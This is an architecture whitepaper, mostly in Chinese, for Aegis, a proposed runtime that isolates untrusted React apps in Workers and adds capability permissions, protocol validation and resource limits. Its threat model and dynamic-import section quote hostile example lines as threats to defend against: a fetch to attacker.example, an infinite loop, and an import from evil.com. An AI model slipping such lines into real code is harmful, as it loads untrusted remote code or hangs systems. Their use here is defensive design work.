---

# Aegis Architecture Whitepaper

### Secure, Capability-Based, Worker-Isolated UI Runtime

**Project:** Aegis
**Version:** 1.0
**Status:** Architecture Proposal

---

# 1. 摘要

Aegis 是一个面向**不受信任应用（Untrusted Applications）**的安全 UI Runtime。

Aegis 允许第三方开发者使用熟悉的：

* React
* JSX
* Hooks
* Component
* State Management

开发应用，同时将应用代码运行在隔离的 Worker 环境中。

应用无法直接访问宿主环境的：

* DOM
* Native UI
* 文件系统
* 摄像头
* 麦克风
* 网络
* Storage
* Clipboard
* 系统能力

所有与宿主的交互必须通过 Aegis 定义的：

1. **UI Protocol**
2. **Capability Protocol**
3. **Resource Policy**

完成。

整体架构：

```text
                         Trusted Host
                              │
          ┌───────────────────┼───────────────────┐
          │                   │                   │
          ▼                   ▼                   ▼
    UI Renderer        Capability Manager   Resource Manager
          │                   │                   │
          └───────────────────┼───────────────────┘
                              │
                       Security Boundary
                              │
══════════════════════════════╪══════════════════════════════
                              │
                              ▼
                    ┌─────────────────────┐
                    │   Isolated Worker   │
                    │                     │
                    │  Untrusted App      │
                    │                     │
                    │  React             │
                    │  JSX               │
                    │  State             │
                    │  Components        │
                    │  Application Logic  │
                    └─────────────────────┘
```

Aegis 的核心理念：

> **Application defines intent. Host controls capability.**

即：

> **应用表达意图，宿主决定能力。**

---

# 2. 项目定位

Aegis 的完整定义：

> **Aegis is a capability-secure, React-compatible UI runtime for executing untrusted applications inside isolated Workers.**

中文：

> **Aegis 是一个基于 Capability Security 和 Worker Isolation 的 React-compatible UI Runtime，用于安全运行不受信任的第三方应用。**

Aegis 不试图成为：

```text
React Alternative
```

也不试图成为：

```text
Faster React
```

而是：

```text
Secure Application Runtime
```

---

# 3. 核心问题

现代应用平台经常需要运行第三方代码：

```text
Mini Programs
Plugins
Extensions
Third-party Apps
AI Generated Apps
Enterprise Plugins
Embedded Apps
```

传统方式通常是：

```text
Host
 │
 └── Third-party JavaScript
          │
          ├── DOM
          ├── Network
          ├── Storage
          ├── Native APIs
          └── Host APIs
```

这种架构的问题是：

> **第三方应用和宿主处于同一个可信执行环境。**

Aegis 将其改变为：

```text
Host
 │
 │ Security Boundary
 │
 ▼
Worker
 │
 └── Untrusted Application
```

---

# 4. 威胁模型

Aegis 默认：

> **应用代码是不可信的。**

不假设第三方开发者是恶意的，也不假设第三方开发者是可信的。

系统必须能够抵御：

### 无限循环

```js
while (true) {}
```

### 非授权网络请求

```js
fetch("https://attacker.example")
```

### 非授权数据访问

```js
readOtherAppStorage()
```

### UI 越权

```text
App A → 修改 App B UI
```

### Capability 越权

```text
App → Camera
```

但 Manifest 没有 camera 权限。

### 资源攻击

```text
Create 1,000,000 UI Nodes
```

### 消息洪泛

```text
Worker → Main
1000000 messages/sec
```

---

# 5. 安全模型

Aegis 使用多层安全模型：

```text
┌─────────────────────────────────┐
│       Application Isolation     │
├─────────────────────────────────┤
│       Worker Isolation          │
├─────────────────────────────────┤
│       Capability Security       │
├─────────────────────────────────┤
│       Protocol Validation       │
├─────────────────────────────────┤
│       Resource Limits           │
├─────────────────────────────────┤
│       Origin / Package Security │
└─────────────────────────────────┘
```

其中 Worker 只是其中一层。

非常重要：

> **Worker ≠ 完整 Sandbox。**

真正的安全边界由：

```text
Worker
+
Capability
+
Protocol
+
Policy
+
Resource Control
```

共同构成。

---

# 6. Trusted / Untrusted Boundary

Aegis 将整个系统分成两个区域。

## Trusted Zone

```text
Host
Main Renderer
Capability Manager
Permission Manager
Resource Manager
Native APIs
```

## Untrusted Zone

```text
Application
React
UI Library
State Management
Business Logic
Third-party Packages
```

架构：

```text
             TRUSTED
┌──────────────────────────────┐
│                              │
│ Host                         │
│ Renderer                     │
│ Capability Manager           │
│ Native APIs                  │
│                              │
└──────────────┬───────────────┘
               │
          SECURITY BOUNDARY
               │
═══════════════╪════════════════
               │
               ▼
┌──────────────────────────────┐
│                              │
│ Worker                       │
│                              │
│ React                        │
│ JSX                          │
│ Application                  │
│ Third-party Libraries        │
│                              │
└──────────────────────────────┘
             UNTRUSTED
```

---

# 7. 为什么 UI 在 Main Thread？

Aegis 中 UI 放在 Main Thread **不是为了性能**。

真正原因是：

> **真实 UI 对象属于 Trusted Host。**

Worker 中只存在：

```text
UI Tree
Virtual Node
Node ID
UI Intent
```

而不存在：

```text
HTMLElement
NativeView
DOM Node
```

例如：

```jsx
<View>
  <Text>Hello</Text>
</View>
```

Worker 中：

```text
View #1
└── Text #2
```

Main：

```text
#1 → Real UI Node
#2 → Real UI Node
```

Worker 永远拿不到真实对象。

---

# 8. Aegis 总体架构

```text
                         AEGIS HOST
┌──────────────────────────────────────────────────────────────┐
│                                                              │
│  ┌──────────────┐      ┌────────────────┐                   │
│  │ App Manager  │      │ Permission     │                   │
│  │              │      │ Manager        │                   │
│  └──────┬───────┘      └───────┬────────┘                   │
│         │                       │                            │
│         └───────────┬───────────┘                            │
│                     │                                        │
│              ┌──────▼───────┐                                │
│              │ Policy Engine│                                │
│              └──────┬───────┘                                │
│                     │                                        │
│              ┌──────▼───────┐                                │
│              │ Main Renderer│                                │
│              └──────┬───────┘                                │
│                     │                                        │
└─────────────────────┼────────────────────────────────────────┘
                      │
                SECURITY BOUNDARY
                      │
══════════════════════╪════════════════════════════════════════
                      │
                      ▼
┌──────────────────────────────────────────────────────────────┐
│                    AEGIS WORKER                              │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │                  Application                           │  │
│  │                                                        │  │
│  │ React / JSX / Components / State / Libraries           │  │
│  └────────────────────────┬───────────────────────────────┘  │
│                           │                                  │
│                  ┌────────▼────────┐                         │
│                  │ Aegis Runtime   │                         │
│                  └────────┬────────┘                         │
│                           │                                  │
│                ┌──────────▼──────────┐                       │
│                │ React Reconciler    │                       │
│                └──────────┬──────────┘                       │
│                           │                                  │
│                ┌──────────▼──────────┐                       │
│                │ Aegis Renderer      │                       │
│                └──────────┬──────────┘                       │
│                           │                                  │
│                ┌──────────▼──────────┐                       │
│                │ Protocol Layer      │                       │
│                └─────────────────────┘                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

# 9. React Compatibility

Aegis 不重新实现 React。

目标架构：

```text
React
 │
 ├── Fiber
 ├── Hooks
 ├── Context
 ├── Scheduler
 └── Reconciler
          │
          ▼
   Aegis Host Config
          │
          ▼
   Aegis Renderer
```

Aegis 负责：

```text
Worker Runtime
Renderer
Protocol
Capabilities
Security
```

React 负责：

```text
Component
Hooks
State
Context
Fiber
Reconciliation
```

这使 Aegis 可以最大程度复用 React 生态。

---

# 10. React 生态兼容等级

### Level 1：直接兼容

目标：

```text
React
React Hooks
Context
Redux
Zustand
Jotai
TanStack Query
```

它们主要运行在 Worker 中。

---

### Level 2：Adapter 兼容

例如：

```text
React Router
React Hook Form
Animation libraries
```

提供：

```text
@aegis/adapter-*
```

---

### Level 3：Aegis Native UI

对于强依赖 DOM 的 UI 库：

```text
Ant Design
MUI
Chakra
```

不追求直接兼容。

而是提供：

```text
@aegis/ui
```

例如：

```jsx
import {
  View,
  Text,
  Button,
  Input
} from "@aegis/ui"
```

---

# 11. JSX

JSX 是 Aegis 的推荐 UI 描述语言。

例如：

```jsx
function App() {
  const [count, setCount] = useState(0)

  return (
    <View>
      <Text>
        Count: {count}
      </Text>

      <Button
        onClick={() => setCount(c => c + 1)}
      >
        +
      </Button>
    </View>
  )
}
```

JSX 完全运行在 Worker。

JSX 本身并不意味着：

```text
DOM
```

而是：

```text
JSX
 ↓
React Element
 ↓
React Fiber
 ↓
Aegis Renderer
```

---

# 12. UI Protocol

UI Protocol 是 Aegis 的核心安全边界之一。

Worker 不允许直接调用：

```js
document.createElement()
```

而是产生：

```text
CREATE_NODE
SET_PROPERTY
SET_TEXT
APPEND_CHILD
REMOVE_CHILD
```

例如：

```json
{
  "version": 1,
  "type": "commit",
  "mutations": [
    {
      "op": "create",
      "nodeId": 1,
      "kind": "view"
    },
    {
      "op": "create",
      "nodeId": 2,
      "kind": "text"
    },
    {
      "op": "setText",
      "nodeId": 2,
      "value": "Hello"
    },
    {
      "op": "append",
      "parent": 1,
      "child": 2
    }
  ]
}
```

---

# 13. Protocol Validation

Main Thread **永远不信任 Worker 消息**。

每一条 Mutation 必须经过：

```text
Decode
 ↓
Schema Validation
 ↓
App Ownership Validation
 ↓
Node Validation
 ↓
Property Validation
 ↓
Resource Validation
 ↓
Apply
```

例如：

```text
SET_PROPERTY
```

Host 检查：

```text
node 是否存在？
node 是否属于当前 App？
property 是否允许？
value 类型是否正确？
value 大小是否超限？
```

---

# 14. Node Namespace

所有 UI Node 都属于某个 Application。

逻辑上：

```text
App A
 ├── Node 1
 ├── Node 2
 └── Node 3

App B
 ├── Node 1
 ├── Node 2
 └── Node 3
```

内部使用：

```text
A:1
A:2
A:3

B:1
B:2
B:3
```

因此：

> **UI Node 永远不能跨 Application 使用。**

---

# 15. Event Protocol

事件方向：

```text
Main
 ↓
DOM / Native Event
 ↓
Event Dispatcher
 ↓
Worker
```

Worker 不直接获得真实 Event Object。

例如：

```json
{
  "type": "event",
  "nodeId": 20,
  "event": "click",
  "handlerId": 100
}
```

事件 Payload：

```ts
interface AegisEvent {
  type: string
  target: NodeId
  currentTarget: NodeId

  value?: string
  checked?: boolean

  clientX?: number
  clientY?: number

  key?: string
}
```

---

# 16. Capability Security

Aegis 的第二个核心系统是：

# Capability Manager

应用不能直接：

```js
camera.capture()
```

而是：

```js
const camera = await aegis.capability("camera")
```

Host 决定：

```text
ALLOW
DENY
PROMPT
```

---

# 17. Manifest

应用拥有 Manifest：

```json
{
  "name": "example",
  "version": "1.0.0",
  "permissions": [
    "storage",
    "network"
  ]
}
```

例如：

```text
storage
network
camera
microphone
location
clipboard
notifications
```

默认：

> **Deny by Default**

没有声明：

```text
camera
```

就无法使用 Camera。

---

# 18. Capability Policy

Capability 不应该只有：

```text
ALLOW / DENY
```

而应该支持 Policy。

例如 Network：

```json
{
  "network": {
    "allow": [
      "api.example.com"
    ]
  }
}
```

Storage：

```json
{
  "storage": {
    "quota": "10MB"
  }
}
```

Camera：

```json
{
  "camera": {
    "mode": "user"
  }
}
```

---

# 19. Capability 生命周期

Capability 与 Application 生命周期绑定：

```text
App Start
   ↓
Create Worker
   ↓
Grant Capabilities
   ↓
Application Running
   ↓
Terminate Worker
   ↓
Revoke Capabilities
```

Worker 消失：

> 所有 Capability 自动失效。

---

# 20. Network

网络访问应该经过：

```text
Worker
 ↓
Aegis Network API
 ↓
Capability Manager
 ↓
Network Policy
 ↓
Host Network
```

而不是：

```text
Worker
 ↓
unrestricted fetch()
```

最终可以实现：

```text
App A
 ├── api.foo.com ✓
 ├── cdn.foo.com ✓
 └── evil.com    ✗
```

---

# 21. Storage

Storage 必须 Namespace Isolation：

```text
Aegis Storage
│
├── app-a/
│
├── app-b/
│
└── app-c/
```

App A：

```js
storage.set("token", value)
```

不能读取：

```text
app-b/token
```

---

# 22. UI Isolation

Host UI：

```text
Host
│
├── App A
│   └── UI Tree A
│
├── App B
│   └── UI Tree B
│
└── System UI
```

App A 只能操作：

```text
UI Tree A
```

任何：

```text
App A → App B UI
App A → System UI
```

都必须被 Host 拒绝。

---

# 23. Resource Management

Aegis 不仅限制 API，也限制资源。

包括：

```text
CPU
Memory
Storage
Network
UI Nodes
Message Rate
Message Size
Tree Depth
```

例如：

```json
{
  "limits": {
    "memory": "64MB",
    "storage": "10MB",
    "uiNodes": 5000,
    "maxMessageSize": "1MB",
    "messagesPerSecond": 1000
  }
}
```

---

# 24. Worker DoS

恶意应用：

```js
while (true) {}
```

Host 必须能够：

```text
Detect
 ↓
Terminate
 ↓
Release Resources
 ↓
Destroy UI
```

而 Host 本身继续运行。

---

# 25. Package Security

Aegis 应用最终以 App Package 形式分发：

```text
example.aegis
│
├── manifest.json
├── app.js
├── chunks/
├── assets/
└── signature
```

安装：

```text
Package
 ↓
Verify
 ↓
Parse Manifest
 ↓
Policy Check
 ↓
Install
```

---

# 26. Application Identity

每一个 Application 有唯一：

```text
App ID
Version
Publisher
Package Hash
Permissions
```

例如：

```text
com.example.todo
```

所有资源均绑定 App Identity。

---

# 27. Code Signing

生产环境支持：

```text
Developer
 ↓
Build
 ↓
Sign
 ↓
Package
 ↓
Store
 ↓
Host Verification
```

Host 验证：

```text
Signature
Hash
Publisher
Version
Manifest
```

---

# 28. Dynamic Import

不允许应用绕过 Package Security：

```js
import("https://evil.com/app.js")
```

动态模块加载必须经过：

```text
Aegis Module Loader
 ↓
Origin Policy
 ↓
Package Policy
 ↓
Signature Policy
 ↓
Allow / Deny
```

---

# 29. Main Renderer

Main Renderer 是 Trusted Computing Base 的核心。

职责只有：

```text
Protocol Decoder
Node Store
Mutation Applier
Event Dispatcher
```

它不应该：

```text
执行 Application JS
运行 React
处理业务逻辑
```

---

# 30. Trusted Computing Base

Aegis 应尽可能缩小 TCB：

```text
             Trusted Host
                  │
      ┌───────────┼───────────┐
      │           │           │
 Protocol     Capability   Resource
 Validator     Manager      Manager
      │
      ▼
 Main Renderer
```

而：

```text
React
Application
UI Library
State Library
```

都不属于 TCB。

---

# 31. Renderer Architecture

Aegis Protocol 不应该绑定 DOM。

```text
                  Aegis Protocol
                        │
          ┌─────────────┼─────────────┐
          ▼             ▼             ▼
     DOM Renderer   MiniApp       Native Renderer
                       Renderer
```

因此同一应用理论上可以：

```text
Web
MiniApp
Desktop
Native
```

运行。

---

# 32. UI Primitive

Aegis 推荐定义语义化 Primitive：

```text
View
Text
Image
Button
Input
ScrollView
List
Modal
```

而不是直接依赖：

```text
div
span
button
```

例如：

```jsx
<View>
  <Text>Hello</Text>
</View>
```

DOM Renderer：

```text
View → div
Text → span
```

MiniApp Renderer：

```text
View → native view
Text → native text
```

Native Renderer：

```text
View → NativeView
Text → NativeText
```

---

# 33. Layout

Worker 无法直接访问真实 Layout。

因此定义：

```ts
measure(node): Promise<Rect>
```

Worker：

```js
const rect = await measure(ref.current)
```

Main：

```text
measure
 ↓
Native Layout
 ↓
Rect
 ↓
Worker
```

Layout API 默认异步。

---

# 34. Ref

Worker 中：

```js
const ref = useRef()
```

不返回：

```text
HTMLElement
```

而返回：

```ts
{
  nodeId: NodeId
}
```

因此：

```text
ref
 ↓
logical node
 ↓
Capability / Protocol
```

而不是：

```text
ref
 ↓
DOM
```

---

# 35. React Lifecycle

React 生命周期完全运行在 Worker：

```text
mount
 ↓
render
 ↓
reconcile
 ↓
commit
 ↓
UI Protocol
 ↓
Main
```

`useEffect`：

```text
Worker
```

而不是：

```text
Main
```

---

# 36. 数据流

完整的数据流：

```text
                    Application
                         │
                         ▼
                      React
                         │
                    State Update
                         │
                         ▼
                    Reconciler
                         │
                         ▼
                  Aegis Renderer
                         │
                         ▼
                    UI Protocol
                         │
                         ▼
                       Host
                         │
                         ▼
                     Real UI
```

反方向：

```text
Real UI
   │
 Event
   ↓
Host
   │
Event Protocol
   ↓
Worker
   │
React Handler
   ↓
State Update
```

形成闭环。

---

# 37. 完整交互流程

用户点击 Button：

```text
                USER
                 │
                 ▼
          Main Thread UI
                 │
              click
                 │
                 ▼
          Event Dispatcher
                 │
        nodeId + handlerId
                 │
                 ▼
             Protocol
                 │
═════════════════╪════════════════
                 │
                 ▼
              Worker
                 │
             handler()
                 │
                 ▼
            setState()
                 │
                 ▼
          React Reconciler
                 │
                 ▼
           UI Mutation
                 │
                 ▼
             Protocol
                 │
═════════════════╪════════════════
                 │
                 ▼
               Main
                 │
           Apply Mutation
                 │
                 ▼
               UI
```

---

# 38. 安全边界总结

Aegis 中存在三个主要边界：

### Boundary 1：Application → Worker

```text
Execution Isolation
```

### Boundary 2：Worker → Host

```text
Protocol + Capability
```

### Boundary 3：App → App

```text
Namespace Isolation
```

最终：

```text
App A
 │
 ├── Worker Isolation
 │
 ├── Capability Boundary
 │
 └── UI Namespace
```

---

# 39. Aegis 与 React 的关系

Aegis 不修改 React 的核心编程模型：

```jsx
function App() {
  const [value, setValue] = useState()

  return (
    <View>
      <Text>{value}</Text>
    </View>
  )
}
```

React 负责：

```text
Component
Hooks
State
Fiber
Reconciliation
```

Aegis 负责：

```text
Isolation
UI
Protocol
Capabilities
Permissions
Resources
```

两者职责明确分离。

---

# 40. 与传统小程序架构的区别

传统：

```text
App
 ↓
Framework
 ↓
Native Bridge
 ↓
Host
```

Aegis：

```text
                 Trusted Host
                      │
                Security Policy
                      │
══════════════════════╪══════════════════════
                      │
                   Worker
                      │
               React Application
                      │
               Aegis Runtime
                      │
                UI Protocol
                      │
══════════════════════╪══════════════════════
                      │
                  Renderer
                      │
                  Native UI
```

最大的区别：

> **第三方代码永远不会直接进入 Host API 层。**

---

# 41. 性能原则

性能不是 Aegis 的首要目标。

优先级：

```text
1. Security
2. Isolation
3. Correctness
4. Compatibility
5. Performance
```

因此第一版应该优先：

```text
postMessage
Structured Clone
```

而不是马上：

```text
SharedArrayBuffer
Atomics
Binary Protocol
```

---

# 42. 性能优化路线

当安全模型稳定后：

```text
Phase 1
postMessage
        ↓
Phase 2
Transferable
        ↓
Phase 3
ArrayBuffer
        ↓
Phase 4
Binary Protocol
        ↓
Phase 5
Shared Memory
```

所有优化都必须满足：

> **Performance optimization must never bypass security validation.**

---

# 43. DevTools

Aegis DevTools 应该同时观察：

### Application

```text
Component Tree
State
Hooks
```

### Security

```text
Capabilities
Permission
Denied Requests
```

### Runtime

```text
Worker Status
Memory
CPU
```

### Protocol

```text
Messages
Mutation Count
Message Size
```

例如：

```text
App: com.example.todo

Worker
  CPU: 12%
  Memory: 18MB

Capabilities
  storage ✓
  network ✓
  camera ✗

UI
  Nodes: 132
  Mutations: 8

Protocol
  Messages: 14
  Bytes: 4.2KB
```

---

# 44. 项目结构

推荐：

```text
aegis/
│
├── packages/
│
│   ├── runtime/
│   │   ├── worker/
│   │   ├── scheduler/
│   │   └── lifecycle/
│   │
│   ├── react/
│   │   ├── reconciler/
│   │   └── host-config/
│   │
│   ├── protocol/
│   │   ├── ui/
│   │   ├── event/
│   │   └── capability/
│   │
│   ├── security/
│   │   ├── policy/
│   │   ├── permission/
│   │   └── validation/
│   │
│   ├── capabilities/
│   │   ├── network/
│   │   ├── storage/
│   │   ├── camera/
│   │   └── location/
│   │
│   ├── renderer/
│   │   ├── dom/
│   │   ├── miniapp/
│   │   └── native/
│   │
│   ├── ui/
│   │   ├── View/
│   │   ├── Text/
│   │   ├── Button/
│   │   └── Input/
│   │
│   └── devtools/
│
├── apps/
│   ├── host/
│   ├── playground/
│   └── inspector/
│
└── docs/
```

---

# 45. MVP

第一阶段绝对不要做完整小程序平台。

只验证：

```text
React
 ↓
Worker
 ↓
Aegis Renderer
 ↓
UI Protocol
 ↓
Main
 ↓
DOM
```

只需要：

```jsx
function App() {
  const [count, setCount] = useState(0)

  return (
    <View>
      <Text>{count}</Text>

      <Button
        onClick={() => setCount(c => c + 1)}
      >
        +
      </Button>
    </View>
  )
}
```

验证：

```text
✓ JSX
✓ React
✓ Worker
✓ useState
✓ UI Protocol
✓ Main Renderer
✓ Event Protocol
✓ Node Isolation
```

---

# 46. 第二阶段

增加：

```text
useEffect
useRef
Context
Input
Form
Storage
Network
```

并验证：

```text
✓ Capability
✓ Permission
✓ Resource Limits
```

---

# 47. 第三阶段

增加：

```text
Package
Manifest
App Identity
Signature
Module Loader
```

形成真正的：

```text
.aegis Application
```

---

# 48. 第四阶段

增加：

```text
Multi-App
App Lifecycle
App Store
Capability UI
DevTools
Crash Recovery
```

最终形成：

```text
Aegis Host
│
├── App A
├── App B
├── App C
└── App D
```

---

# 49. 最终产品模型

Aegis 最终不是一个单纯的 Framework，而是三个层次：

```text
                    Aegis Platform
                         │
        ┌────────────────┼────────────────┐
        │                │                │
        ▼                ▼                ▼
    Aegis Runtime   Aegis Host       Aegis SDK
        │                │                │
        │                │                │
      React          Security          JSX
      Worker         Capability        UI
      Runtime        Renderer          APIs
```

其中：

### Aegis Runtime

运行第三方应用。

### Aegis Host

提供可信环境。

### Aegis SDK

让开发者开发应用。

---

# 50. 核心设计原则

Aegis 最终应该遵循以下原则：

```text
01. Application code is untrusted.

02. Worker provides execution isolation.

03. Worker is not the sole security boundary.

04. Application never receives real DOM or Native objects.

05. All Host interaction happens through explicit protocols.

06. Capabilities are explicit and deny-by-default.

07. Every Application has isolated UI and storage namespaces.

08. Host validates every message from Worker.

09. Resource usage is bounded.

10. Capability lifetime follows Application lifetime.

11. React is an application runtime, not a security boundary.

12. UI libraries cannot bypass the Capability system.

13. Trusted Host code must remain minimal.

14. Performance optimizations must never weaken isolation.

15. Security semantics take priority over React compatibility.
```

---

# 51. Aegis 的核心抽象

整个系统最终可以浓缩成五个核心对象：

```text
┌─────────────────────────────────┐
│            Application          │
│       Untrusted Program         │
└────────────────┬────────────────┘
                 │
                 ▼
┌─────────────────────────────────┐
│             Worker              │
│       Execution Isolation       │
└────────────────┬────────────────┘
                 │
          ┌──────┴──────┐
          ▼             ▼
┌────────────────┐ ┌────────────────┐
│  UI Protocol   │ │   Capability   │
│                │ │    Protocol    │
└───────┬────────┘ └───────┬────────┘
        │                  │
        └────────┬─────────┘
                 ▼
┌─────────────────────────────────┐
│          Trusted Host           │
│                                 │
│ Renderer / Native / Resources  │
└─────────────────────────────────┘
```

---

# 52. 最终愿景

Aegis 最终希望做到：

开发者只需要写：

```jsx
import {
  View,
  Text,
  Button
} from "@aegis/ui"

export default function App() {
  const [count, setCount] = useState(0)

  return (
    <View>
      <Text>Hello Aegis</Text>

      <Text>
        {count}
      </Text>

      <Button
        onClick={() => setCount(c => c + 1)}
      >
        Increment
      </Button>
    </View>
  )
}
```

但是运行时实际上是：

```text
                 Untrusted
                    │
                    ▼
              ┌───────────┐
              │   React   │
              └─────┬─────┘
                    │
              Worker Runtime
                    │
          ┌─────────┴─────────┐
          │                   │
          ▼                   ▼
    UI Protocol        Capability API
          │                   │
          └─────────┬─────────┘
                    │
              Security Boundary
                    │
                    ▼
             Trusted Host
                    │
        ┌───────────┴───────────┐
        ▼                       ▼
   UI Renderer            Native APIs
```

开发者获得的是：

> **React + JSX 的开发体验。**

宿主获得的是：

> **隔离、权限、资源控制和可验证的安全边界。**

而 Aegis 的核心价值可以用一句话概括：

# **Aegis — Let untrusted code build UI, without letting it own the host.**

中文：

# **Aegis —— 让不受信任的代码构建 UI，但永远不能拥有宿主。**
